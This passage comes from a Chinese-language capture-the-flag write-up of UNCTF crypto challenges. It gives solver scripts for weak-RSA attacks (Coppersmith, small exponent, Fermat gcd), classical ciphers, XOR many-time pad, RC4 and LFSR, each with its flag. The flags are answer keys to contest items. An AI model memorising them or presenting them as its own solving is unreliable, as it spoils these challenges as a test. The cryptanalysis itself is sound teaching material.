class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(cc)):</span><br><span class="line">    cc[i] ^= cc[i-<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">cc = [<span class="built_in">hex</span>(k)[<span class="number">2</span>:].rjust(<span class="number">32</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> k <span class="keyword">in</span> cc]</span><br><span class="line"><span class="built_in">print</span>(cc)</span><br><span class="line"></span><br><span class="line">s=<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>))</span><br><span class="line">t=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    t[md5(<span class="built_in">chr</span>(k).encode()).hexdigest()]=<span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> cc:</span><br><span class="line">    flag += t[k]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;a197271943ceb3c3fe98bcadf10c29d4&#125; </span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h3><p>常规RSA。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504</span></span><br><span class="line">p = gmpy2.iroot(n,<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">f = p**<span class="number">3</span>*(p-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;unctf&#123;pneum0n0ultram01cr0sc0p01cs01l01c0v0lcan0c0n010s01s&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Single-table"><a href="#Single-table" class="headerlink" title="Single table"></a>Single table</h3><p>读加密方式，明显的playfair密码。</p><p>按照key排列好字母表，手动把每两个字母取出解密后，排列为 <code>UNCTFGODYOUKNOWPLAYFAIRX</code>，在适当的地方加符号分割单词：<code>UNCTF&#123;GOD_YOU_KNOW_PLAYFAIR&#125;</code>。</p><p>​    </p><h3 id="Multi-table"><a href="#Multi-table" class="headerlink" title="Multi table"></a>Multi table</h3><p>变表维吉尼亚密码，先根据前4字符确定key值，再遍历爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase</span><br><span class="line"></span><br><span class="line">base_table = [<span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]</span><br><span class="line"></span><br><span class="line">table=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">  table[i]=ascii_uppercase[i:]+ascii_uppercase[:i]</span><br><span class="line"></span><br><span class="line">ori = <span class="string">&#x27;UNCT&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;SDCG&#x27;</span></span><br><span class="line">key = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  <span class="keyword">for</span> k,v <span class="keyword">in</span> table.items():</span><br><span class="line">    <span class="keyword">if</span> v[base_table.index(ori[i])] == res[i]:</span><br><span class="line">      key.append(k)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;SDCGW&#123;MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">  <span class="keyword">if</span> c[i] <span class="keyword">in</span> ascii_uppercase:</span><br><span class="line">    now = table[key[x%<span class="number">4</span>]].index(c[i]) </span><br><span class="line">    flag += base_table[now]</span><br><span class="line">    x += <span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    flag += c[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [9, 15, 23, 16]</span></span><br><span class="line"><span class="comment"># UNCTF&#123;WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><p>泄露 $m$ 高位的Coppersmith攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431</span></span><br><span class="line">c = <span class="number">15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107</span></span><br><span class="line">e =  <span class="number">6</span> </span><br><span class="line">mbar = <span class="number">11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240</span></span><br><span class="line">kbits = <span class="number">60</span></span><br><span class="line">nbits = n.nbits()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;upper &#123;&#125; bits of &#123;&#125; bits is given&quot;</span>.<span class="built_in">format</span>(nbits - kbits, nbits))</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (mbar + x)^e - c</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor = n</span></span><br><span class="line">m = mbar + x0</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;27a0aac7-76cb-427d-9129-1476360d5d1b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><p>泄露 $p$ 高位的Coppersmith攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140</span></span><br><span class="line">n = <span class="number">102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span></span><br><span class="line">p4 = <span class="number">8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857</span></span><br><span class="line">e =  <span class="number">0x10001</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line">kbits = <span class="number">200</span></span><br><span class="line"><span class="built_in">print</span>(p4.nbits())</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line">p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;It is a very_intersting_test!!!&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezxor"><a href="#ezxor" class="headerlink" title="ezxor"></a>ezxor</h3><blockquote><p>你知道多次一密吗？</p></blockquote><p>多次一密（MTP）攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> sets, sys</span><br><span class="line"></span><br><span class="line">ciphers = <span class="string">&#x27;&#x27;&#x27;1c2063202e1e795619300e164530104516182d28020005165e01494e0d</span></span><br><span class="line"><span class="string">2160631d325b3b421c310601453c190814162d37404510041b55490d5d</span></span><br><span class="line"><span class="string">3060631d325b3e59033a1252102c560207103b22020613450549444f5d</span></span><br><span class="line"><span class="string">3420277421122f55067f1207152f19170659282b090b56121701405318</span></span><br><span class="line"><span class="string">212626742b1434551b2b4105007f110c041c7f361c451e0a02440d010a</span></span><br><span class="line"><span class="string">75222a22230877102137045212300409165928264c091f131701484f5d</span></span><br><span class="line"><span class="string">21272d33661237441a7f005215331706175930254c0817091b4244011c</span></span><br><span class="line"><span class="string">303c2674311e795e103a05520d300600521831274c031f0b160148555d</span></span><br><span class="line"><span class="string">3c3d63232909355455300752033a17175e59372c1c0056111d01474813</span></span><br><span class="line"><span class="string">752b22272f1e2b10063e0816452b1e041c593b2c02005a450649440110</span></span><br><span class="line"><span class="string">396e2f3d201e795f137f07130c2b1e450510332f4c08170e17014d481b&#x27;&#x27;&#x27;</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strxor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">target_fix</span>(<span class="params">target_cipher</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;-------begin-------&#x27;</span></span><br><span class="line"></span><br><span class="line">    final_key = [<span class="literal">None</span>]*<span class="number">150</span></span><br><span class="line">    known_key_positions = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> current_index, ciphertext <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">        counter = collections.Counter()</span><br><span class="line">        <span class="keyword">for</span> index, ciphertext2 <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">            <span class="keyword">if</span> current_index != index:</span><br><span class="line">                <span class="keyword">for</span> indexOfChar, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>), ciphertext2.decode(<span class="string">&#x27;hex&#x27;</span>))):</span><br><span class="line">                    <span class="keyword">if</span> char <span class="keyword">in</span> string.printable <span class="keyword">and</span> char.isalpha(): counter[indexOfChar] += <span class="number">1</span></span><br><span class="line">        knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ind, val <span class="keyword">in</span> counter.items():</span><br><span class="line">            <span class="keyword">if</span> val &gt;= <span class="number">7</span>: knownSpaceIndexes.append(ind)</span><br><span class="line"></span><br><span class="line">        xor_with_spaces = strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>),<span class="string">&#x27; &#x27;</span>*<span class="number">150</span>)</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> knownSpaceIndexes:</span><br><span class="line">            final_key[index] = xor_with_spaces[index].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">            known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line">    final_key_hex = <span class="string">&#x27;&#x27;</span>.join([val <span class="keyword">if</span> val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&#x27;00&#x27;</span> <span class="keyword">for</span> val <span class="keyword">in</span> final_key])</span><br><span class="line">    output = strxor(target_cipher.decode(<span class="string">&#x27;hex&#x27;</span>),final_key_hex.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Fix this sentence:&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join([char <span class="keyword">if</span> index <span class="keyword">in</span> known_key_positions <span class="keyword">else</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(output)])+<span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;------end------&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ciphers:</span><br><span class="line">    target_fix(i)</span><br></pre></td></tr></table></figure><p>补全可能的明文单词，反复尝试得到key：<code>UNCTF&#123;Y0u_are_very_Clever!!!&#125;</code>。</p><p>​    </p><h3 id="今晚吃什么"><a href="#今晚吃什么" class="headerlink" title="今晚吃什么"></a>今晚吃什么</h3><blockquote><p>全部大写</p></blockquote><p><code>10000</code> 换 <code>A</code>，<code>00000</code> 换 <code>B</code>，培根密码解得 <code>CRYPROISFUN</code>。</p><p>​    </p><h3 id="Today-is-Thursday-V-me-50"><a href="#Today-is-Thursday-V-me-50" class="headerlink" title="Today_is_Thursday_V_me_50"></a>Today_is_Thursday_V_me_50</h3><p>按代码逻辑还原即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;unctf&quot;</span></span><br><span class="line">key1 = <span class="string">b&#x27;Today_is_Thursday_V_me_50&#x27;</span></span><br><span class="line">key1_num = bytes_to_long(key1)</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;Q\x19)T\x18\x1b(\x03\t^c\x08QiF&gt;Py\x124DNg3P&#x27;</span></span><br><span class="line"></span><br><span class="line">random.seed(key1_num)</span><br><span class="line">message = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    temp_num = random.randint(<span class="number">1</span>,<span class="number">128</span>)</span><br><span class="line">    message += long_to_bytes(temp_num ^ i)</span><br><span class="line"></span><br><span class="line">guess = [i <span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(name, <span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    what = guess.pop(<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span>.join(j <span class="keyword">for</span> j <span class="keyword">in</span> what)</span><br><span class="line">mask = strxor(<span class="number">5</span>*name.encode(),key1)</span><br><span class="line"><span class="built_in">print</span>(mask)</span><br><span class="line">out = strxor(mask,message)</span><br><span class="line"><span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;unctf&#123;1_l0ve_Thurs4Ay!!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Fermat"><a href="#Fermat" class="headerlink" title="Fermat"></a>Fermat</h3><p>已知 $g+x=x \cdot p$，则 $g=x(p-1)$，结合费马小定理，有 </p><p>$a^g \bmod p = a^{ x(p-1)} \bmod p = (a^x)^{(p-1)} \bmod p = 1$ （$a$ 为任意整数）</p><p>取 $a=2$，即 $2^g \bmod p = 1$，$2^g-1=k_1p$，</p><p>而 $2^g \bmod p = (2^g \bmod n) \bmod p=1$，则 $2^g \bmod n = 1+k_2p$，</p><p>故 $(2^g \bmod n)-1=k_2p$ 也是 $p$ 的倍数，则有 $p=\gcd\Big((2^g \bmod n)-1,n\Big)$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">19793392713544070457027688479915778034777978273001720422783377164900114996244094242708846944654400975309197274029725271852278868848866055341793968628630614866044892220651519906766987523723167772766264471738575578352385622923984300236873960423976260016266837752686791744352546924090533029391012155478169775768669029210298020072732213084681874537570149819864200486326715202569620771301183541168920293383480995205295027880564610382830236168192045808503329671954996275913950214212865497595508488636836591923116671959919150665452149128370999053882832187730559499602328396445739728918488554797208524455601679374538090229259</span></span><br><span class="line">c = <span class="number">388040015421654529602726530745444492795380886347450760542380535829893454552342509717706633524047462519852647123869277281803838546899812555054346458364202308821287717358321436303133564356740604738982100359999571338136343563820284214462840345638397346674622692956703291932399421179143390021606803873010804742453728454041597734468711112843307879361621434484986414368504648335684946420377995426633388307499467425060702337163601268480035415645840678848175121483351171989659915143104037610965403453400778398233728478485618134227607237718738847749796204570919757202087150892548180370435537346442018275672130416574430694059</span></span><br><span class="line">g = <span class="number">28493930909416220193248976348190268445371212704486248387964331415565449421099615661533797087163499951763570988748101165456730856835623237735728305577465527656655424601018192421625513978923509191087994899267887557104946667250073139087563975700714392158474439232535598303396614625803120915200062198119177012906806978497977522010955029535460948754300579519507100555238234886672451138350711195210839503633694262246536916073018376588368865238702811391960064511721322374269804663854748971378143510485102611920761475212154163275729116496865922237474172415758170527875090555223562882324599031402831107977696519982548567367160</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">p = gcd(<span class="built_in">pow</span>(<span class="number">2</span>,g,n)-<span class="number">1</span>,n)</span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;DO_y0u_Fermat_1ittle_theOrem&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="超级加倍"><a href="#超级加倍" class="headerlink" title="超级加倍"></a>超级加倍</h3><p>根据”加倍“，脑洞大猜小指数 $e$ 攻击，开方即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c=<span class="number">364948328635256862807658970246807356738683637564484151183420122283833769442806688034764747801289594899501872549412387392353830842750341246881725380294423193634163908298756097744423833369487321345708403908358587818931161805853745707954962941881920962518131654701890269025702523666873057795301975752113492236398361724355733200822450695761</span></span><br><span class="line">m=gmpy2.iroot(c,<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;it_is_much_bigger_than_before&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EZcry"><a href="#EZcry" class="headerlink" title="EZcry"></a>EZcry</h3><blockquote><p>提示1：流密码</p></blockquote><p>密文：<code>dd9f58b37289edc2c40133ab9f0439c140aafe7cfd501f8c3d79b1856c9bda598ce34a02a57c</code>，</p><p>key：<code>12345678</code></p><p>根据提示测试常见流密码，RC4成功解出 <code>flag&#123;83e429d991d24c548b9dbd256975d0d5&#125;</code>。</p><p>​    </p><h3 id="easy-lfsr"><a href="#easy-lfsr" class="headerlink" title="easy_lfsr"></a>easy_lfsr</h3><blockquote><p>你能求出我的mask吗</p></blockquote><p>根据512级LFSR连续1024个bit的产出，求掩码。</p><p>由于LFSR的性质，每一次生成的bit都会加到向量的最低位，同时丢弃掉最高位bit。于是在连续512次生成之后，原有的 KEY 所有的位都被丢弃，LFSR的状态会转为已知的512个bit，即所给出的串的前512位。之后完全知道了LFSR的状态，只需要在已知状态的情况下推出掩码。</p><p>每连续512个bit可以生成下一个bit。已知这512个 bit，也知道下一个bit，但掩码未知。问题等价于：在 $\text{GF}(2)$ 上，512位的已知的状态向量，点乘512位的掩码向量，得到的数已知，求掩码向量。状态向量有512维，则有512组方程。</p><p>解方程组的问题转化为矩阵求逆问题。把LFSR状态逐行写在矩阵上，形成的矩阵记为 $M$，把LFSR每次所生成的结果拼成的向量记为 $T$，则掩码向量 $v$ 有：$M \cdot v = T$，即 $v=M^{-1} \cdot T$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">r1 = <span class="number">1261758973831852037364036680281442789461569523587512977925542995725854499352478233840720068310447535900840104847512878006505600998481136843381903570688446</span></span><br><span class="line">r2 = <span class="number">1563853949934744587783542352813857485182445023523734908403585490477271641971239139925690033798570364214960692427704824920072270819031456154655408096237757</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    s = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">bin</span>(r1)[<span class="number">2</span>:].rjust(<span class="number">512</span>,<span class="string">&#x27;0&#x27;</span>)+<span class="built_in">bin</span>(r2)[<span class="number">2</span>:].rjust(<span class="number">512</span>,<span class="string">&#x27;0&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">    M = matrix(GF(<span class="number">2</span>), <span class="number">512</span>, <span class="number">512</span>)</span><br><span class="line">    T = vector(GF(<span class="number">2</span>), <span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s) - <span class="number">512</span>):</span><br><span class="line">        M[i] = s[i : i + <span class="number">512</span>]</span><br><span class="line">        T[i] = s[i+<span class="number">512</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mask = M.inverse() * T</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, (mask))),<span class="number">2</span>)</span><br><span class="line">    